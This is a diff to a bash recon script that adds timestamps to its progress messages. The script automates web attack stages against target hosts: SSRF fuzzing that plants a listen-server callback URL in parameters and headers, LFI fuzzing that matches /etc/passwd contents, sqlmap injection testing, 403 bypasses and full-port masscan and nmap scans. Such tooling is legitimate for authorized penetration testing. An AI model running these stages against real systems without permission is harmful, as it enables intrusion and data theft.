@@ -60,7 +60,7 @@ enumeratesubdomains(){
   elif [ "$list" = "1" ]; then
     cp $1 $TARGETDIR/enumerated-subdomains.txt
   else
-    echo "Enumerating all known domains using:"
+    echo "[$(date | awk '{ print $4}')] Enumerating all known domains using:"
 
     # Passive subdomain enumeration
     echo "subfinder..."
@@ -120,6 +120,7 @@ enumeratesubdomains(){
       error_handler
     fi
   fi
+  echo "[$(date | awk '{ print $4}')] enumeration done."
 }
 
 getwaybackurl(){
@@ -144,6 +145,8 @@ getgithubendpoints(){
 }
 
 checkwaybackurls(){
+  echo
+  echo "[$(date | awk '{ print $4}')] get wayback machine stuff..."
   SCOPE=$1
 
   getgau $1 &
@@ -166,6 +169,7 @@ checkwaybackurls(){
     < $TARGETDIR/wayback/wayback_output.txt unfurl format %S | sort | uniq > $TARGETDIR/wayback-subdomains-wordlist.txt
     sort -u $customSubdomainsWordList $TARGETDIR/wayback-subdomains-wordlist.txt -o $customSubdomainsWordList
   fi
+  echo "[$(date | awk '{ print $4}')] wayback machine done."
 }
 
 sortsubdomains(){
@@ -175,20 +179,22 @@ sortsubdomains(){
 
 dnsbruteforcing(){
   if [[  -n "$wildcard" && -n "$vps" ]]; then
-    echo "puredns bruteforce..."
+    echo "[$(date | awk '{ print $4}')] puredns bruteforce..."
     # https://sidxparab.gitbook.io/subdomain-enumeration-guide/active-enumeration/dns-bruteforcing
     puredns bruteforce $BRUTEDNSWORDLIST $1 -r $MINIRESOLVERS --wildcard-batch 100000 -l 5000 -q | tee $TARGETDIR/purebruteforce.txt >> $TARGETDIR/1-real-subdomains.txt
     sort -u $TARGETDIR/1-real-subdomains.txt -o $TARGETDIR/1-real-subdomains.txt
+    echo "[$(date | awk '{ print $4}')] puredns bruteforce done."
   fi
 }
 
 permutatesubdomains(){
   if [[ -n "$alt" && -n "$wildcard" && -n "$vps" ]]; then
-    echo "dnsgen..."
+    echo "[$(date | awk '{ print $4}')] dnsgen..."
     dnsgen $TARGETDIR/1-real-subdomains.txt -w $customSubdomainsWordList > $TARGETDIR/tmp/dnsgen_out.txt
     sed "${SEDOPTION[@]}" '/^[.]/d;/^[-]/d;/\.\./d' $TARGETDIR/tmp/dnsgen_out.txt
 
     sort -u $TARGETDIR/1-real-subdomains.txt $TARGETDIR/tmp/dnsgen_out.txt -o $TARGETDIR/2-all-subdomains.txt
+    echo "[$(date | awk '{ print $4}')] dnsgen done"
   fi
 }
 
@@ -200,23 +206,24 @@ dnsprobing(){
   # check we test hostname or IP
   if [[ -n "$ip" ]]; then
     echo
-    echo "[dnsx] try to get PTR records"
+    echo "[$(date | awk '{ print $4}')] [dnsx] try to get PTR records"
     echo $1 > $TARGETDIR/dnsprobe_ip.txt
     echo $1 | dnsx -silent -ptr -resp-only -o $TARGETDIR/dnsprobe_subdomains.txt # also try to get subdomains
   elif [[ -n "$cidr" ]]; then
-    echo "[dnsx] try to get PTR records"
+    echo "[$(date | awk '{ print $4}')] [dnsx] try to get PTR records"
     cp  $TARGETDIR/enumerated-subdomains.txt $TARGETDIR/dnsprobe_ip.txt
     dnsx -silent -ptr -resp-only -r $MINIRESOLVERS -l $TARGETDIR/dnsprobe_ip.txt -o $TARGETDIR/dnsprobe_subdomains.txt # also try to get subdomains
   elif [[ -n "$single" ]]; then
+    echo "[$(date | awk '{ print $4}')] [dnsx] getting hostnames and its A records:"
     echo $1 | dnsx -silent -a -resp-only -o $TARGETDIR/dnsprobe_ip.txt
     echo $1 > $TARGETDIR/dnsprobe_subdomains.txt
   elif [[ -n "$list" ]]; then
-      echo "[massdns] probing and wildcard sieving..."
+      echo "[$(date | awk '{ print $4}')] [massdns] probing and wildcard sieving..."
       # shuffledns -silent -list $TARGETDIR/2-all-subdomains.txt -retries 1 -r $MINIRESOLVERS -o $TARGETDIR/shuffledns-list.txt
       puredns -r $MINIRESOLVERS resolve $TARGETDIR/2-all-subdomains.txt --wildcard-batch 100000 -l 5000 -w $TARGETDIR/resolved-list.txt
       # # additional resolving because shuffledns/pureDNS missing IP on output
       echo
-      echo "[dnsx] getting hostnames and its A records:"
+      echo "[$(date | awk '{ print $4}')] [dnsx] getting hostnames and its A records:"
       # -t mean cuncurrency
       dnsx -silent -t 250 -a -resp -r $MINIRESOLVERS -l $TARGETDIR/resolved-list.txt -o $TARGETDIR/dnsprobe_out.txt
       # clear file from [ and ] symbols
@@ -225,12 +232,12 @@ dnsprobing(){
       cut -f1 -d ' ' $TARGETDIR/dnsprobe_output_tmp.txt | sort | uniq > $TARGETDIR/dnsprobe_subdomains.txt
       cut -f2 -d ' ' $TARGETDIR/dnsprobe_output_tmp.txt | sort | uniq > $TARGETDIR/dnsprobe_ip.txt
   else
-      echo "[puredns] massdns probing with wildcard sieving..."
+      echo "[$(date | awk '{ print $4}')] [puredns] massdns probing with wildcard sieving..."
       puredns -r $MINIRESOLVERS resolve $TARGETDIR/2-all-subdomains.txt --wildcard-batch 100000 -l 5000 -w $TARGETDIR/resolved-list.txt
       # shuffledns -silent -d $1 -list $TARGETDIR/2-all-subdomains.txt -retries 5 -r $MINIRESOLVERS -o $TARGETDIR/shuffledns-list.txt
       # additional resolving because shuffledns missing IP on output
       echo
-      echo "[dnsx] getting hostnames and its A records:"
+      echo "[$(date | awk '{ print $4}')] [dnsx] getting hostnames and its A records:"
       # -t mean cuncurrency
       dnsx -silent -t 250 -a -resp -r $MINIRESOLVERS -l $TARGETDIR/resolved-list.txt -o $TARGETDIR/dnsprobe_out.txt
 
@@ -240,12 +247,12 @@ dnsprobing(){
       cut -f1 -d ' ' $TARGETDIR/dnsprobe_output_tmp.txt | sort | uniq > $TARGETDIR/dnsprobe_subdomains.txt
       cut -f2 -d ' ' $TARGETDIR/dnsprobe_output_tmp.txt | sort | uniq > $TARGETDIR/dnsprobe_ip.txt
   fi
-  echo "[dnsx] done."
+  echo "[$(date | awk '{ print $4}')] [dnsx] done."
 }
 
 checkhttprobe(){
   echo
-  echo "[httpx] Starting http probe testing..."
+  echo "[$(date | awk '{ print $4}')] [httpx] Starting http probe testing..."
   # resolve IP and hosts using socket address style for chromium, nuclei, gospider, ssrf, lfi and bruteforce
   if [[ -n "$ip" || -n "$cidr" ]]; then
     echo "[httpx] IP probe testing..."
@@ -261,7 +268,7 @@ checkhttprobe(){
 
       if [[ ( -n "$alt" || -n "$vps" ) && -s "$TARGETDIR"/dnsprobe_ip.txt ]]; then
         echo
-        echo "finding math mode of the IP numbers"
+        echo "[$(date | awk '{ print $4}')] [math Mode] finding math Mode of the IP numbers"
         MODEOCTET=$(cut -f1 -d '.' $TARGETDIR/dnsprobe_ip.txt | sort -n | uniq -c | sort | tail -n1 | xargs)
         ISMODEOCTET1=$(echo $MODEOCTET | awk '{ print $1 }')
         if ((ISMODEOCTET1 > 1)); then
@@ -272,7 +279,8 @@ checkhttprobe(){
           if ((ISMODEOCTET2 > 1)); then
             MODEOCTET2=$(echo $MODEOCTET | awk '{ print $2 }')
             CIDR1="${MODEOCTET1}.${MODEOCTET2}.0.0/16"
-            echo "mode found: $CIDR1"
+            echo "[math Mode] found: $CIDR1"
+            echo "[math Mode] resolve PTR of the IP numbers"
             # look at https://github.com/projectdiscovery/dnsx/issues/34 to add `-wd` support here
             mapcidr -silent -cidr $CIDR1 | dnsx -silent -resp-only -ptr | grep $1 | sort | uniq | tee $TARGETDIR/dnsprobe_ptr.txt | \
                 puredns -q -r $MINIRESOLVERS resolve --wildcard-batch 100000 -l 5000 | \
@@ -284,27 +292,27 @@ checkhttprobe(){
 
           fi
         fi
-        echo "finding math mode done."
+        echo "[$(date | awk '{ print $4}')] [math Mode] done."
       fi
   fi
-  echo "[httpx] done."
+  echo "[$(date | awk '{ print $4}')] [httpx] done."
 }
 
 bypass403test(){
   echo
-  echo "[bypass403] Try bypass 4xx..."
+  echo "[$(date | awk '{ print $4}')] [bypass403] Try bypass 4xx..."
   if [ -s $TARGETDIR/403-all-subdomain-live-scheme.txt ]; then
     # xargs -n1 -I {} bypass-403 "{}" "" < "$TARGETDIR/403-all-subdomain-live-scheme.txt"
     interlace --silent -tL "$TARGETDIR/403-all-subdomain-live-scheme.txt" -threads 50 -c "bypass-403 _target_ ''" | grep -E "\[2[0-9]{2}\]" | tee $TARGETDIR/403-bypass-output.txt
   fi
-  echo "[bypass403] done."
+  echo "[$(date | awk '{ print $4}')] [bypass403] done."
 }
 
 gospidertest(){
   if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     SCOPE=$1
     echo
-    echo "[gospider] Web crawling..."
+    echo "[$(date | awk '{ print $4}')] [gospider] Web crawling..."
     gospider -q -r -S $TARGETDIR/3-all-subdomain-live-scheme.txt --timeout 7 -o $TARGETDIR/gospider -c 40 -t 40 1> /dev/null
 
     # combine the results and filter out of scope
@@ -317,7 +325,7 @@ gospidertest(){
     # extract domains
     < $TARGETDIR/gospider/gospider_out.txt unfurl --unique domains | grep "${SCOPE}" | sort | uniq | \
                   $httpxcall >> $TARGETDIR/3-all-subdomain-live-scheme.txt
-    echo "[gospider] done."
+    echo "[$(date | awk '{ print $4}')] [gospider] done."
   fi
 }
 
@@ -325,7 +333,7 @@ pagefetcher(){
   if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     SCOPE=$1
     echo
-    echo "[page-fetch] Fetch page's DOM..."
+    echo "[$(date | awk '{ print $4}')] [page-fetch] Fetch page's DOM..."
     < $TARGETDIR/3-all-subdomain-live-scheme.txt page-fetch -o $TARGETDIR/page-fetched --no-third-party --exclude image/ --exclude css/ 1> /dev/null
     grep -horE "https?:[^\"\\'> ]+|www[.][^\"\\'> ]+" $TARGETDIR/page-fetched | grep "${SCOPE}" | sort | uniq | qsreplace -a > $TARGETDIR/page-fetched/pagefetcher_output.txt
 
@@ -334,27 +342,28 @@ pagefetcher(){
 
     # sort new assets
     sort -u $TARGETDIR/3-all-subdomain-live-scheme.txt -o $TARGETDIR/3-all-subdomain-live-scheme.txt
-    echo "[page-fetch] done."
+    echo "[$(date | awk '{ print $4}')] [page-fetch] done."
   fi
 }
 
 # async ability for execute chromium
 screenshots(){
   if [ -s "$TARGETDIR"/3-all-subdomain-live-scheme.txt ]; then
+    echo "[$(date | awk '{ print $4}')] [screenshot] starts..."
     mkdir "$TARGETDIR"/screenshots
     ./helpers/gowitness.sh "$TARGETDIR/3-all-subdomain-live-scheme.txt"
     chown -R $HOMEUSER: $TARGETDIR/screenshots/
-    echo "[screenshot] done."
+    echo "[$(date | awk '{ print $4}')] [screenshot] done."
   fi
 }
 
 nucleitest(){
   if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     echo
-    echo "[nuclei] technologies testing..."
+    echo "[$(date | awk '{ print $4}')] [nuclei] technologies testing..."
     # use -c for maximum templates processed in parallel
     nuclei -silent -l $TARGETDIR/3-all-subdomain-live-scheme.txt -t $HOMEDIR/nuclei-templates/technologies/ -o $TARGETDIR/nuclei/nuclei_output_technology.txt
-    echo "[nuclei] CVE testing..."
+    echo "[$(date | awk '{ print $4}')] [nuclei] CVE testing..."
     nuclei -silent -o $TARGETDIR/nuclei/nuclei_output.txt \
                     -l $TARGETDIR/3-all-subdomain-live-scheme.txt \
                     -t $HOMEDIR/nuclei-templates/vulnerabilities/ \
@@ -380,7 +389,7 @@ nucleitest(){
                     -t $HOMEDIR/nuclei-templates/exposures/tokens/generic/credentials-disclosure.yaml \
                     -t $HOMEDIR/nuclei-templates/exposures/tokens/generic/general-tokens.yaml \
                     -t $HOMEDIR/nuclei-templates/fuzzing/
-    echo "[nuclei] CVE testing done."
+    echo "[$(date | awk '{ print $4}')] [nuclei] CVE testing done."
 
     if [ -s $TARGETDIR/nuclei/nuclei_output.txt ]; then
       cut -f4 -d ' ' $TARGETDIR/nuclei/nuclei_output.txt | unfurl paths | sed 's/^\///;s/\/$//;/^$/d' | sort | uniq > $TARGETDIR/nuclei/nuclei_unfurl_paths.txt
@@ -402,8 +411,8 @@ nucleitest(){
 custompathlist(){
   < $TARGETDIR/3-all-subdomain-live-scheme.txt unfurl format '%d:%P' > $TARGETDIR/3-all-subdomain-live-socket.txt
   chown $HOMEUSER: $TARGETDIR/3-all-subdomain-live-scheme.txt
-
-  echo "Prepare custom queryList"
+  echo
+  echo "[$(date | awk '{ print $4}')] Prepare custom queryList"
   if [[ -n "$mad" ]]; then
     sort -u $TARGETDIR/wayback/wayback_output.txt $TARGETDIR/gospider/gospider_out.txt $TARGETDIR/page-fetched/pagefetcher_output.txt -o $queryList
     # rm -rf $TARGETDIR/wayback/wayback_output.txt
@@ -421,13 +430,13 @@ custompathlist(){
   fi
 
   if [[ -n "$fuzz" ]]; then
-    echo "Prepare custom customSsrfQueryList"
+    echo "[$(date | awk '{ print $4}')] Prepare custom customSsrfQueryList"
     # https://github.com/tomnomnom/gf/issues/55
     # sudo -u $HOMEUSER helpers/gf-filter.sh ssrf $queryList $customSsrfQueryList &
     xargs -n1 -I {} grep -oiaE "(([[:alnum:][:punct:]]+)+)?{}=" $queryList < $PARAMSLIST >> $customSsrfQueryList || true &
     pid_01=$!
 
-    echo "Prepare custom customSqliQueryList"
+    echo "[$(date | awk '{ print $4}')] Prepare custom customSqliQueryList"
     grep -oaiE "(([[:alnum:][:punct:]]+)+)?(php3?)\?[[:alnum:]]+=([[:alnum:][:punct:]]+)?" $queryList > $customSqliQueryList || true &
     pid_02=$!
     echo "wait $pid_01 $pid_02" 
@@ -436,7 +445,7 @@ custompathlist(){
     sort -u $customSsrfQueryList -o $customSsrfQueryList
     sort -u $customSqliQueryList -o $customSqliQueryList
 
-    echo "Prepare custom customLfiQueryList"
+    echo "[$(date | awk '{ print $4}')] Prepare custom customLfiQueryList"
     # 1 limited to lfi pattern
     grep -oiaE "(([[:alnum:][:punct:]]+)+)?(cat|dir|source|attach|cmd|action|board|detail|location|file|download|path|folder|prefix|include|inc|locate|site|show|doc|view|content|con|document|layout|mod|root|pg|style|template|php_path|admin)=" $customSsrfQueryList > $customLfiQueryList || true
     # 2 limited to [:alnum:]=file.ext pattern
@@ -450,7 +459,7 @@ custompathlist(){
     chown $HOMEUSER: $customSsrfQueryList
     chown $HOMEUSER: $customLfiQueryList
     chown $HOMEUSER: $customSqliQueryList
-    echo "Custom queryList done."
+    echo "[$(date | awk '{ print $4}')] Custom queryList done."
   fi
 }
 
@@ -461,21 +470,22 @@ custompathlist(){
 ssrftest(){
   if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     echo
-    echo "[SSRF-1] Headers..."
+    echo "[$(date | awk '{ print $4}')] [SSRF-1] Headers..."
     ssrf-headers-tool $TARGETDIR/3-all-subdomain-live-scheme.txt $LISTENSERVER > /dev/null
+    echo "[$(date | awk '{ print $4}')] [SSRF-1] done."
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
-    echo "[SSRF-2] Blind probe..."
+    echo "[$(date | awk '{ print $4}')] [SSRF-2] Blind probe..."
     xargs -n1 -I {} ffuf -timeout 4 -mc all -t 1050 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
                          -mode pitchfork < $PARAMSLIST > /dev/null
-    echo "[SSRF-2] Blind probe done."
+    echo "[$(date | awk '{ print $4}')] [SSRF-2] done."
     echo
     if [ -s "$TARGETDIR/ssrf-path-list.txt" ]; then
       # similar to paramspider but all wayback without limits
-      echo "[SSRF-3] prepare ssrf-list: concat .com?params= out with listen server..."
+      echo "[$(date | awk '{ print $4}')] [SSRF-3] prepare ssrf-list: concat .com?params= out with listen server..."
 
       while read line; do
         echo "${line}${LISTENSERVER}" >> $TARGETDIR/ssrf-original-list.txt
@@ -488,18 +498,18 @@ ssrftest(){
       chown $HOMEUSER: $TARGETDIR/ssrf-original-list.txt
       chown $HOMEUSER: $TARGETDIR/ssrf-list.txt
 
-      echo "[SSRF-3] fuzz original endpoints from wayback and fetched data"
+      echo "[$(date | awk '{ print $4}')] [SSRF-3] fuzz original endpoints from wayback and fetched data"
       ENDPOINTCOUNT=$(< $TARGETDIR/ssrf-original-list.txt wc -l)
       echo "requests count = $ENDPOINTCOUNT"
           ffuf -timeout 5 -mc all -t 750 -u HOST -w $TARGETDIR/ssrf-original-list.txt:HOST > /dev/null
-      echo "[SSRF-3] done."
+      echo "[$(date | awk '{ print $4}')] [SSRF-3] done."
       echo
-      echo "[SSRF-4] fuzz mixed headers with original endpoints from wayback and fetched data"
+      echo "[$(date | awk '{ print $4}')] [SSRF-4] fuzz mixed headers with original endpoints from wayback and fetched data"
           ssrf-headers-tool $TARGETDIR/ssrf-original-list.txt $LISTENSERVER > /dev/null
-      echo "[SSRF-4] done."
+      echo "[$(date | awk '{ print $4}')] [SSRF-4] done."
       echo
 
-      echo "[SSRF-5] fuzz all live servers with ssrf-list"
+      echo "[$(date | awk '{ print $4}')] [SSRF-5] fuzz all live servers with ssrf-list"
       # simple math to watch progress
       ENDPOINTCOUNT=$(< $TARGETDIR/ssrf-list.txt wc -l)
       HOSTCOUNT=$(< $TARGETDIR/3-all-subdomain-live-scheme.txt wc -l)
@@ -509,7 +519,7 @@ ssrftest(){
           ffuf -timeout 4 -mc all -t 750 -u HOSTPATH \
               -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
               -w $TARGETDIR/ssrf-list.txt:PATH > /dev/null
-      echo "[SSRF-5] done."
+      echo "[$(date | awk '{ print $4}')] [SSRF-5] done."
     fi
   fi
 }
@@ -519,7 +529,7 @@ ssrftest(){
 lfitest(){
   if [[ -s "$customLfiQueryList" ]]; then
     echo
-    echo "[LFI] ffuf with all live servers with lfi-path-list using wordlist/LFI-payload.txt..."
+    echo "[$(date | awk '{ print $4}')] [LFI] ffuf with all live servers with lfi-path-list using wordlist/LFI-payload.txt..."
       # simple math to watch progress
       HOSTCOUNT=$(< $customLfiQueryList wc -l)
       ENDPOINTCOUNT=$(< $LFIPAYLOAD wc -l)
@@ -539,17 +549,18 @@ lfitest(){
              -mr "root:[x*]:0:0:" \
              -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
              -o $TARGETDIR/ffuf/lfi-matched-url.txt > /dev/null
-    echo "[LFI] done."
+    echo "[$(date | awk '{ print $4}')] [LFI] done."
   fi
 }
 
 sqlmaptest(){
   if [[ -s "$customSqliQueryList" ]]; then
     # perform the sqlmap
-    echo "[sqlmap] SQLi testing..."
+    echo
+    echo "[$(date | awk '{ print $4}')] [sqlmap] SQLi testing..."
     # turn on more tests by swithing: --risk=3 --level=5
     sqlmap -m $customSqliQueryList --batch --random-agent -f --banner --ignore-code=404 --output-dir=$TARGETDIR/sqlmap/
-    echo "[sqlmap] done."
+    echo "[$(date | awk '{ print $4}')] [sqlmap] done."
   fi
 }
 
@@ -559,14 +570,14 @@ sqlmaptest(){
 # }
 masscantest(){
   if [ -s $TARGETDIR/dnsprobe_ip.txt ]; then
-    echo "[masscan] Looking for open ports..."
+    echo "[$(date | awk '{ print $4}')] [masscan] Looking for open ports..."
     # max-rate for accuracy
     # 25/587-smtp, 110/995-pop3, 143/993-imap, 445-smb, 3306-mysql, 3389-rdp, 5432-postgres, 5900/5901-vnc, 27017-mongodb
     # masscan -p0-65535 | -p0-1000,2375,3306,3389,4990,5432,5900,6379,6066,8080,8383,8500,8880,8983,9000,27017 -iL $TARGETDIR/dnsprobe_ip.txt --rate 1000 --open-only -oG $TARGETDIR/masscan_output.gnmap
     masscan -p1-65535 -iL $TARGETDIR/dnsprobe_ip.txt --rate 1000 -oG $TARGETDIR/masscan_output.gnmap
     sleep 1
     sed "${SEDOPTION[@]}" '1d;2d;$d' $TARGETDIR/masscan_output.gnmap # remove 1,2 and last lines from masscan out file
-    echo "[masscan] done."
+    echo "[$(date | awk '{ print $4}')] [masscan] done."
   fi
 }
 
@@ -576,7 +587,7 @@ nmap_nse(){
   # https://gist.github.com/storenth/b419dc17d2168257b37aa075b7dd3399
   # https://youtu.be/La3iWKRX-tE?t=1200
   # https://medium.com/@noobhax/my-recon-process-dns-enumeration-d0e288f81a8a
-  echo "[nmap] scanning..."
+  echo "[$(date | awk '{ print $4}')] [nmap] scanning..."
   mkdir $TARGETDIR/nmap
   while read line; do
     IP=$(echo $line | awk '{ print $4 }')
@@ -599,16 +610,19 @@ nmap_nse(){
     echo
     echo
   done < $TARGETDIR/masscan_output.gnmap
+  echo "[$(date | awk '{ print $4}')] [nmap] done."
 }
 
 # directory bruteforce
 ffufbrute(){
-    echo "Start directory bruteforce using ffuf..."
+    echo
+    echo "[$(date | awk '{ print $4}')] Start directory bruteforce using ffuf..."
       # gobuster -x append to each word in the selected wordlist
       # gobuster dir -u https://target.com -w ~/wordlist.txt -t 100 -x php,cgi,sh,txt,log,py,jpeg,jpg,png
       # ffuf -c stands for colorized, -s for silent mode
       interlace --silent -tL $TARGETDIR/3-all-subdomain-live-scheme.txt -threads 20 -c "ffuf -timeout 7 -u _target_/FUZZ -mc all -fc 300,301,302,303,304,400,403,404,406,500,501,502,503 -fs 0 \-w $customFfufWordList -t $dirsearchThreads -p 0.1-2.0 -recursion -recursion-depth 2 -H \"X-Original-URL: /admin\" -H \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36\" \-o $TARGETDIR/ffuf/_cleantarget_.html -of html"
       chown -R $HOMEUSER: $TARGETDIR/ffuf
+    echo "[$(date | awk '{ print $4}')] directory bruteforce done."
 }
 
 recon(){
@@ -734,6 +748,7 @@ main(){
     LISTENSERVER=$(tail -n 1 $TARGETDIR/_listen_server.log)
     LISTENSERVER=$(echo $LISTENSERVER | cut -f2 -d ' ')
     echo "Listen server is up $LISTENSERVER with PID=$SERVER_PID"
+    echo
   fi
 
   # collect call parameters
